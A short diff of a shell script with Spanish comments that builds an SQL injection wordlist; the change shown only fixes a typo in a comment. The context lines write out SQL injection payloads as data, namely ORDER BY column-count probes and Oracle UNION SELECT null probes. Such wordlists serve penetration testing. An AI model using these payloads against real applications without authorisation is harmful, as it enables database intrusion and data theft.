@@ -12,7 +12,7 @@ cat *.txt | sort -u > sqli_wl.txt
 # se añaden payloads de order by
 seq 1 20 | xargs -I{} echo "' ORDER BY {}-- -" >> sqli_wl.txt
 
-# añadimos paylaods de union select para oracle:                           
+# añadimos payloads de union select para oracle:                           
 echo "' UNION SELECT null from dual-- -" >> sqli_wl.txt 
 echo "' UNION SELECT null,null from dual-- -" >> sqli_wl.txt 
 echo "' UNION SELECT null,null,null from dual-- -" >> sqli_wl.txt 
